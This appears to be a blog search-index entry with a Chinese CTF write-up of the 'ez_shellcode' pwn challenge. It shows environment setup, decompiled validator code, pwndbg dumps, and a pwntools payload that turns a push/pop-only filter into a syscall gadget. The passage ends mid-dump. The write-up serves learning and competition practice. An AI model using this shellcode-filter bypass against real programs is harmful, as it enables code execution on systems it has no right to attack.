<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Pwn题笑笑传之奇葩Pwn题</title>
    <link href="/2025/10/14/Pwn%E9%A2%98%E7%AC%91%E7%AC%91%E4%BC%A0%E4%B9%8B%E5%A5%87%E8%91%A9Pwn%E9%A2%98/"/>
    <url>/2025/10/14/Pwn%E9%A2%98%E7%AC%91%E7%AC%91%E4%BC%A0%E4%B9%8B%E5%A5%87%E8%91%A9Pwn%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="Pwn题笑笑传之奇葩Pwn题"><a href="#Pwn题笑笑传之奇葩Pwn题" class="headerlink" title="Pwn题笑笑传之奇葩Pwn题"></a>Pwn题笑笑传之奇葩Pwn题</h2><hr><h3 id="第21届湖南省大学生计算机程序设计竞赛-–-网络攻防-–-ez-shellcode-线下断网比赛"><a href="#第21届湖南省大学生计算机程序设计竞赛-–-网络攻防-–-ez-shellcode-线下断网比赛" class="headerlink" title="[第21届湖南省大学生计算机程序设计竞赛 – 网络攻防] – ez_shellcode ( 线下断网比赛 )"></a>[第21届湖南省大学生计算机程序设计竞赛 – 网络攻防] – ez_shellcode ( 线下断网比赛 )</h3><p>附件下载：<a href="https://z-l-s-f.lanzouq.com/ildpn38emmdi">ez_shellcode.zip</a></p><p>check：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/zlsf/com/SS/002/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    RUNPATH:    b<span class="hljs-string">&#x27;./libcapstone.so.4&#x27;</span><br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>环境配置：</p><p>刚下载出来的时候需要配置 libcapstone.so.4 ,  libc.so.6 , ld-linux-x86-64.so.2 三个链接文件。</p><p>根据赛后了解不少新师傅寄在了第一步，只会打 ld 和 libc，libcapstone.so.4 发现不知道怎么打上去。</p><p>实际上其打法和 libc 一样属于动态链接库，使用如下命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">patchelf --replace-needed libcapstone.so.4 ./libcapstone.so.4 ./pwn <br></code></pre></td></tr></table></figure><p>libc 打法如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn <br></code></pre></td></tr></table></figure><p>ld 打法如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./pwn <br></code></pre></td></tr></table></figure><p>before:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">╰─ ldd ./pwn<br>linux-vdso.so.1 (0x00007f4c8cc36000)<br>libcapstone.so.4 =&gt; not found<br>libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4c8ca00000)<br>/lib64/ld-linux-x86-64.so.2 (0x00007f4c8cc38000)<br></code></pre></td></tr></table></figure><p>after:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">╰─ ldd ./pwn<br>linux-vdso.so.1 (0x0000716137430000)<br>./libcapstone.so.4 (0x0000716136c00000)<br>./libc.so.6 (0x0000716136800000)<br>./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x0000716137432000)<br></code></pre></td></tr></table></figure><p>其实到这里一切都不是大问题。</p><p>而令人思之发笑的原因在于你做完这些以后仍然不能运行程序。</p><p>运行程序出现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">╰─ ./pwn<br><span class="hljs-built_in">chroot</span> failed: Operation not permitted<br></code></pre></td></tr></table></figure><p>原因大概是是程序在 init 函数的 57 行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( chroot(<span class="hljs-string">&quot;/tmp/jail&quot;</span>) )<br>&#123;<br>  v6 = __errno_location();<br>  v7 = strerror(*v6);<br>  <span class="hljs-built_in">fprintf</span>(_bss_start, <span class="hljs-string">&quot;chroot failed: %s\n&quot;</span>, v7);<br>  fflush(_bss_start);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数需要 root 权限才能执行。</p><p>众所周知，作为符合 linux 要求规范的用户，我们平常都是使用普通用户，而一旦我们要用 sudo 运行该程序就上了个大 B 当了。因为我们的 pwn 环境完全是基于当前普通用户安装的，切换成 root 用户运行后 pwntools 完全不好和程序进行通讯，而且由于是线下赛，在无网络的环境下也是不敢贸然改动配置。</p><p>所以我为了绕过这个限制，正好提前准备了一些专门用来调试的虚拟机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">╰─ docker ps -a             <br>CONTAINER ID   IMAGE               COMMAND       CREATED        STATUS                      PORTS     NAMES<br>a68606c3fbe7   pwn-box-16.04       <span class="hljs-string">&quot;/bin/bash&quot;</span>   2 months ago   Exited (0) 2 months ago               pwn-box-16.04<br>0f1cb9a81ef0   pwn-box-24.04       <span class="hljs-string">&quot;/bin/bash&quot;</span>   3 months ago   Exited (130) 3 months ago             pwn-box-24.04<br>095f57452089   ubuntu:16.04        <span class="hljs-string">&quot;/bin/bash&quot;</span>   3 months ago   Exited (0) 3 months ago               kernel-bulid-16.04<br>e16f0e9f2623   ubuntu:20.04        <span class="hljs-string">&quot;/bin/bash&quot;</span>   5 months ago   Exited (0) 3 months ago               kernel-bulid-20.04<br>1c64b338c5af   debian-pwn-box-11   <span class="hljs-string">&quot;sh&quot;</span>          6 months ago   Exited (137) 5 months ago             debian-pwn-box-11<br>bf669a48bb3c   pwn-box-18.04       <span class="hljs-string">&quot;/bin/bash&quot;</span>   6 months ago   Exited (0) 6 months ago               pwn-box-18.04<br>d27f4411cd39   pwn-box-20.04       <span class="hljs-string">&quot;/bin/bash&quot;</span>   6 months ago   Exited (0) 3 months ago               pwn-box-20.04<br>a7895a6b544e   pwn-box-22.04       <span class="hljs-string">&quot;/bin/bash&quot;</span>   6 months ago   Exited (137) 23 hours ago             pwn-box-22.04<br>34e538203db8   python:2.7          <span class="hljs-string">&quot;/bin/bash&quot;</span>   7 months ago   Exited (0) 7 months ago   <br></code></pre></td></tr></table></figure><p>启用后都是默认进入 root shell。而且都可以和宿主机完成跨 docker 与 exp 联动调试。</p><p>详见 <a href="https://xz.aliyun.com/news/17785">利用pwntools脚本联动内置gdb函数优雅的调试docker中的pwn程序</a>。</p><p>至此已经完成了所有的环境准备，可以开始正式分析题目。</p><p>ida:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">void</span> *buf; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br>  <span class="hljs-type">ssize_t</span> v5; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  init(argc, argv, envp);<br>  buf = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  v5 = read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x1000</span>uLL);<br>  <span class="hljs-keyword">if</span> ( v5 &gt; <span class="hljs-number">0</span> &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)validate(buf, v5) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)install_seccomp() )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;seccomp install failed&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))buf)();<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>main 函数中的 init 和 install_seccomp 函数都不重要，其中 install_seccomp 注册的沙盒我们可以通过 patch 掉前面的代码之后使用 seccomp-tools 检查沙盒。</p><p>是的，如果你没有过掉 validate 的检查，你连沙盒都看不了，而需要过 validate 的检查就必须要用 pwntools ，此时又用不了 seccomp-tools。</p><p>所以我建议 —– 直接 patch ！！！</p><p>在输入完 shellcode 后程序会直接执行你的 shellcode。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">validate</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">bool</span> v3; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+1Ch] [rbp-44h]</span><br>  __int64 v5; <span class="hljs-comment">// [rsp+20h] [rbp-40h] BYREF</span><br>  __int64 v6; <span class="hljs-comment">// [rsp+28h] [rbp-38h] BYREF</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+30h] [rbp-30h]</span><br>  <span class="hljs-type">unsigned</span> __int64 i; <span class="hljs-comment">// [rsp+38h] [rbp-28h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+40h] [rbp-20h]</span><br>  <span class="hljs-type">char</span> *s1; <span class="hljs-comment">// [rsp+48h] [rbp-18h]</span><br>  _BYTE *v11; <span class="hljs-comment">// [rsp+50h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v12; <span class="hljs-comment">// [rsp+58h] [rbp-8h]</span><br><br>  v12 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v4 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)cs_open(<span class="hljs-number">3LL</span>, <span class="hljs-number">8LL</span>, &amp;v5) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  v9 = cs_disasm(v5, a1, a2, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, &amp;v6);<br>  v7 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">if</span> ( !v9 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0LL</span>; i &lt; v9; ++i )<br>  &#123;<br>    s1 = (<span class="hljs-type">char</span> *)(v6 + <span class="hljs-number">240</span> * i + <span class="hljs-number">34</span>);<br>    v11 = (_BYTE *)(v6 + <span class="hljs-number">240</span> * i + <span class="hljs-number">66</span>);<br>    v3 = !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;pop&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;push&quot;</span>);<br>    v4 &amp;= *v11 == <span class="hljs-number">114</span> &amp;&amp; v3;<br>    v7 += *(<span class="hljs-type">unsigned</span> __int16 *)(v6 + <span class="hljs-number">240</span> * i + <span class="hljs-number">16</span>);<br>  &#125;<br>  cs_free(v6, v9);<br>  cs_close(&amp;v5);<br>  <span class="hljs-keyword">return</span> (a2 == v7) &amp; (<span class="hljs-type">unsigned</span> __int8)v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>这部分逆向出来大致意思就是只允许你写入的 shellcode 存在 pop r系列和 push r系列的指令。</p><p>这意味着我们可以轻松控制任何一个寄存器，至于如何劫持程序流蛮，也十分简单，就是通过 pop rsp 和 push r系列的指令通过 pop 栈上存在的 shellcode 地址到 rsp 中就能将栈指针引到 shellcode 上，此时再次 push 就能将任一寄存器的内容压入 shellcode 完成对 shellcode 的修改。</p><p>我们现在来看看当执行 shellcode 时每个寄存器的内容以及栈上的内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────<br> RAX  <span class="hljs-number">0</span><br> RBX  <span class="hljs-number">0</span><br> RCX  <span class="hljs-number">0x763bd4460381</span> (prctl+<span class="hljs-number">81</span>) ◂— cmp rax, <span class="hljs-number">-0x1000</span> <span class="hljs-comment">/* &#x27;H=&#x27; */</span><br> RDX  <span class="hljs-number">0x763bd4bef000</span> ◂— <span class="hljs-number">0x5f</span> <span class="hljs-comment">/* &#x27;_&#x27; */</span><br> RDI  <span class="hljs-number">0x16</span><br> RSI  <span class="hljs-number">2</span><br> R8   <span class="hljs-number">0</span><br> R9   <span class="hljs-number">0x763bd4bef000</span> ◂— <span class="hljs-number">0x5f</span> <span class="hljs-comment">/* &#x27;_&#x27; */</span><br> R10  <span class="hljs-number">0x763bd4460381</span> (prctl+<span class="hljs-number">81</span>) ◂— cmp rax, <span class="hljs-number">-0x1000</span> <span class="hljs-comment">/* &#x27;H=&#x27; */</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x7ffe792a2ee8</span> —▸ <span class="hljs-number">0x7ffe792a38d2</span> ◂— <span class="hljs-number">0x4f48006e77702f2e</span> <span class="hljs-comment">/* &#x27;./pwn&#x27; */</span><br> R13  <span class="hljs-number">0x578797144ba6</span> (main) ◂— endbr64 <br> R14  <span class="hljs-number">0x578797146ce8</span> (__do_global_dtors_aux_fini_array_entry) —▸ <span class="hljs-number">0x578797144420</span> (__do_global_dtors_aux) ◂— endbr64 <br> R15  <span class="hljs-number">0x763bd4bf2040</span> (_rtld_global) —▸ <span class="hljs-number">0x763bd4bf32e0</span> —▸ <span class="hljs-number">0x578797143000</span> ◂— <span class="hljs-number">0x10102464c457f</span><br> RBP  <span class="hljs-number">0x7ffe792a2dd0</span> ◂— <span class="hljs-number">1</span><br>*RSP  <span class="hljs-number">0x7ffe792a2db8</span> —▸ <span class="hljs-number">0x578797144c4c</span> (main+<span class="hljs-number">166</span>) ◂— jmp main+<span class="hljs-number">183</span><br>*RIP  <span class="hljs-number">0x763bd4bef000</span> ◂— <span class="hljs-number">0x5f</span> <span class="hljs-comment">/* &#x27;_&#x27; */</span><br>──────────────────────[ DISASM / x86<span class="hljs-number">-64</span> / <span class="hljs-built_in">set</span> emulate on ]──────────────────────<br> ► <span class="hljs-number">0x763bd4bef000</span>    pop    rdi                    RDI =&gt; <span class="hljs-number">0x578797144c4c</span> (main+<span class="hljs-number">166</span>)<br>   <span class="hljs-number">0x763bd4bef001</span>    add    byte ptr [rax], al<br>   <span class="hljs-number">0x763bd4bef003</span>    add    byte ptr [rax], al<br>   <span class="hljs-number">0x763bd4bef005</span>    add    byte ptr [rax], al<br>   <span class="hljs-number">0x763bd4bef007</span>    add    byte ptr [rax], al<br>   <span class="hljs-number">0x763bd4bef009</span>    add    byte ptr [rax], al<br>   <span class="hljs-number">0x763bd4bef00b</span>    add    byte ptr [rax], al<br>   <span class="hljs-number">0x763bd4bef00d</span>    add    byte ptr [rax], al<br>   <span class="hljs-number">0x763bd4bef00f</span>    add    byte ptr [rax], al<br>   <span class="hljs-number">0x763bd4bef011</span>    add    byte ptr [rax], al<br>   <span class="hljs-number">0x763bd4bef013</span>    add    byte ptr [rax], al<br>───────────────────────────────────[ STACK ]────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp <span class="hljs-number">0x7ffe792a2db8</span> —▸ <span class="hljs-number">0x578797144c4c</span> (main+<span class="hljs-number">166</span>) ◂— jmp main+<span class="hljs-number">183</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│<span class="hljs-number">-010</span> <span class="hljs-number">0x7ffe792a2dc0</span> —▸ <span class="hljs-number">0x763bd4bef000</span> ◂— <span class="hljs-number">0x5f</span> <span class="hljs-comment">/* &#x27;_&#x27; */</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│<span class="hljs-number">-008</span> <span class="hljs-number">0x7ffe792a2dc8</span> ◂— <span class="hljs-number">1</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│ rbp <span class="hljs-number">0x7ffe792a2dd0</span> ◂— <span class="hljs-number">1</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│+<span class="hljs-number">008</span> <span class="hljs-number">0x7ffe792a2dd8</span> —▸ <span class="hljs-number">0x763bd4363d90</span> ◂— mov edi, eax<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│+<span class="hljs-number">010</span> <span class="hljs-number">0x7ffe792a2de0</span> ◂— <span class="hljs-number">0</span><br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│+<span class="hljs-number">018</span> <span class="hljs-number">0x7ffe792a2de8</span> —▸ <span class="hljs-number">0x578797144ba6</span> (main) ◂— endbr64 <br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│+<span class="hljs-number">020</span> <span class="hljs-number">0x7ffe792a2df0</span> ◂— <span class="hljs-number">0x100000000</span><br>─────────────────────────────────[ BACKTRACE ]──────────────────────────────────<br> ► <span class="hljs-number">0</span>   <span class="hljs-number">0x763bd4bef000</span> None<br>   <span class="hljs-number">1</span>   <span class="hljs-number">0x578797144c4c</span> main+<span class="hljs-number">166</span><br>   <span class="hljs-number">2</span>   <span class="hljs-number">0x763bd4363d90</span> None<br>   <span class="hljs-number">3</span>   <span class="hljs-number">0x763bd4363e40</span> __libc_start_main+<span class="hljs-number">128</span><br>   <span class="hljs-number">4</span>   <span class="hljs-number">0x5787971443a5</span> _start+<span class="hljs-number">37</span><br>────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; <br></code></pre></td></tr></table></figure><p>此时我们除了控制到程序流还有一个最重要的问题，怎么修改 shellcode 为我们想要的指令。</p><p>在我们能控制各个寄存器后我们目前最想要的肯定是 syscall 指令，其 16 进制为 \x05\x0f。</p><p>而栈上和寄存器内都没有该值。对于这个问题，我有一个绝妙的办法，可惜这里 … … 完全可以写下 ！</p><p>我们将目光放回到我们输入 shellcode 的时候，我们不难发现我们可以输入高达 0x1000 字节长度的 shellcode。</p><p>而 v5 则是存放我们输入长度的变量，v5 明显是存在于栈上的。</p><p>这意味着我们可以在我们的 shellcode 后面填充大量的毫无意义的 pop 来将 v5 变成 0x50F 。</p><p>这正是我们需要的 syscall。</p><p>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              pop rbx</span><br><span class="hljs-string">              pop rsi</span><br><span class="hljs-string">              pop rdx</span><br><span class="hljs-string">              pop rbx</span><br><span class="hljs-string">              pop rbx</span><br><span class="hljs-string">              pop rdi</span><br><span class="hljs-string">              push rsi</span><br><span class="hljs-string">              pop rsp</span><br><span class="hljs-string">              pop rbx</span><br><span class="hljs-string">              pop rbx</span><br><span class="hljs-string">              pop rbx</span><br><span class="hljs-string">              push rdx</span><br><span class="hljs-string">              &#x27;&#x27;&#x27;</span>)<br><br>payload = payload.ljust(<span class="hljs-number">0x50f</span>, asm(<span class="hljs-string">&#x27;&#x27;&#x27; pop rbx &#x27;&#x27;&#x27;</span>))<br><br>se(payload)<br></code></pre></td></tr></table></figure><p>此时的内存 belike:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────<br> RAX  <span class="hljs-number">0</span><br> RBX  <span class="hljs-number">0</span><br> RCX  <span class="hljs-number">0x79fee95d8381</span> (prctl+<span class="hljs-number">81</span>) ◂— cmp rax, <span class="hljs-number">-0x1000</span> <span class="hljs-comment">/* &#x27;H=&#x27; */</span><br> RDX  <span class="hljs-number">0x79fee9d67000</span> ◂— pop rbx <span class="hljs-comment">/* 0x5c565f5b5b5a5e5b */</span><br> RDI  <span class="hljs-number">0x16</span><br> RSI  <span class="hljs-number">2</span><br> R8   <span class="hljs-number">0</span><br> R9   <span class="hljs-number">3</span><br> R10  <span class="hljs-number">0x79fee95d8381</span> (prctl+<span class="hljs-number">81</span>) ◂— cmp rax, <span class="hljs-number">-0x1000</span> <span class="hljs-comment">/* &#x27;H=&#x27; */</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x7fff6f9bf168</span> —▸ <span class="hljs-number">0x7fff6f9bf8d2</span> ◂— <span class="hljs-number">0x4f48006e77702f2e</span> <span class="hljs-comment">/* &#x27;./pwn&#x27; */</span><br> R13  <span class="hljs-number">0x5b3cb73f2ba6</span> (main) ◂— endbr64 <br> R14  <span class="hljs-number">0x5b3cb73f4ce8</span> (__do_global_dtors_aux_fini_array_entry) —▸ <span class="hljs-number">0x5b3cb73f2420</span> (__do_global_dtors_aux) ◂— endbr64 <br> R15  <span class="hljs-number">0x79fee9d6a040</span> (_rtld_global) —▸ <span class="hljs-number">0x79fee9d6b2e0</span> —▸ <span class="hljs-number">0x5b3cb73f1000</span> ◂— <span class="hljs-number">0x10102464c457f</span><br> RBP  <span class="hljs-number">0x7fff6f9bf050</span> ◂— <span class="hljs-number">1</span><br>*RSP  <span class="hljs-number">0x7fff6f9bf038</span> —▸ <span class="hljs-number">0x5b3cb73f2c4c</span> (main+<span class="hljs-number">166</span>) ◂— jmp main+<span class="hljs-number">183</span><br>*RIP  <span class="hljs-number">0x79fee9d67000</span> ◂— pop rbx <span class="hljs-comment">/* 0x5c565f5b5b5a5e5b */</span><br>──────────────────────[ DISASM / x86<span class="hljs-number">-64</span> / <span class="hljs-built_in">set</span> emulate on ]──────────────────────<br> ► <span class="hljs-number">0x79fee9d67000</span>    pop    rbx     RBX =&gt; <span class="hljs-number">0x5b3cb73f2c4c</span> (main+<span class="hljs-number">166</span>)<br>   <span class="hljs-number">0x79fee9d67001</span>    pop    rsi     RSI =&gt; <span class="hljs-number">0x79fee9d67000</span><br>   <span class="hljs-number">0x79fee9d67002</span>    pop    rdx     RDX =&gt; <span class="hljs-number">0x50f</span><br>   <span class="hljs-number">0x79fee9d67003</span>    pop    rbx     RBX =&gt; <span class="hljs-number">1</span><br>   <span class="hljs-number">0x79fee9d67004</span>    pop    rbx     RBX =&gt; <span class="hljs-number">0x79fee94dbd90</span><br>   <span class="hljs-number">0x79fee9d67005</span>    pop    rdi     RDI =&gt; <span class="hljs-number">0</span><br>   <span class="hljs-number">0x79fee9d67006</span>    push   rsi<br>   <span class="hljs-number">0x79fee9d67007</span>    pop    rsp     RSP =&gt; <span class="hljs-number">0x79fee9d67000</span><br>   <span class="hljs-number">0x79fee9d67008</span>    pop    rbx     RBX =&gt; <span class="hljs-number">0x5c565f5b5b5a5e5b</span><br>   <span class="hljs-number">0x79fee9d67009</span>    pop    rbx     RBX =&gt; <span class="hljs-number">0x5b5b5b5b525b5b5b</span><br>   <span class="hljs-number">0x79fee9d6700a</span>    pop    rbx     RBX =&gt; <span class="hljs-number">0x5b5b5b5b5b5b5b5b</span><br>───────────────────────────────────[ STACK ]────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp <span class="hljs-number">0x7fff6f9bf038</span> —▸ <span class="hljs-number">0x5b3cb73f2c4c</span> (main+<span class="hljs-number">166</span>) ◂— jmp main+<span class="hljs-number">183</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│<span class="hljs-number">-010</span> <span class="hljs-number">0x7fff6f9bf040</span> —▸ <span class="hljs-number">0x79fee9d67000</span> ◂— pop rbx <span class="hljs-comment">/* 0x5c565f5b5b5a5e5b */</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│<span class="hljs-number">-008</span> <span class="hljs-number">0x7fff6f9bf048</span> ◂— <span class="hljs-number">0x50f</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│ rbp <span class="hljs-number">0x7fff6f9bf050</span> ◂— <span class="hljs-number">1</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│+<span class="hljs-number">008</span> <span class="hljs-number">0x7fff6f9bf058</span> —▸ <span class="hljs-number">0x79fee94dbd90</span> ◂— mov edi, eax<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│+<span class="hljs-number">010</span> <span class="hljs-number">0x7fff6f9bf060</span> ◂— <span class="hljs-number">0</span><br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│+<span class="hljs-number">018</span> <span 